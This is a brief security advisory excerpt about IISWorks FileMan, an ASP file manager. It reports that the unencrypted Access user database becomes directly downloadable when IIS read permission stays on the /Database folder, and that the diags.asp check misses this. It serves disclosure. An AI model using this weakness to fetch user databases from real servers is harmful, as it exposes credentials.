[+] Description
    IISWorks FileMan is an .asp-based web interface meant to simplify the
    process of uploading, downloading, and otherwise managing files on a
server.
    The script uses an unencrypted Microsoft Access database file for user
and
    permissions administration.

    * If 'Read' permissions are not revoked in IIS on the /Database folder,
the user
      db will be directly downloadable. The FileMan diags.asp installation
verification
      script does not check for this permission setting.
